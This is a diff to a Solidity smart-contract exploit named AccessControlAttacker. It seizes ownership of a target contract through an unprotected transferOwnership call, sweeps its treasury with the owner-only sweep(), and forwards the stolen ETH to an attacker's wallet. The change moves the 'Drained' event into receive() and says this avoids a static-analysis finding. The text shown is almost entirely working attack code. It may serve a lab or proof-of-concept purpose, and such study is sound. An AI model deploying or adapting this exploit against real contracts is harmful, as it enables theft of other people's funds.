@@ -33,18 +33,22 @@ contract AccessControlAttacker {
         emit AttackerStarted(address(config));
 
         // Step 1: walk through the unlocked door. No value, no caller check.
-        config.transferOwnership(address(this));
         emit Hijacked(address(this));
+        config.transferOwnership(address(this));
 
         // Step 2: use the key we just took. sweep() is onlyOwner, and we ARE
         // the owner now, so it pays out willingly.
-        uint256 amount = config.totalAssets();
         config.sweep(address(this));
-        emit Drained(amount);
     }
 
     /// @notice Accept the swept treasury.
-    receive() external payable {}
+    /// @dev Drained is emitted HERE rather than in attack(). Two reasons: this
+    ///      reports what the exploit actually received instead of what it
+    ///      predicted from a totalAssets() read, and no external call precedes
+    ///      it, so the file carries no `reentrancy-events` finding.
+    receive() external payable {
+        emit Drained(msg.value);
+    }
 
     /// @notice Forward the stolen ETH to the attacker's EOA.
     function collect() external {
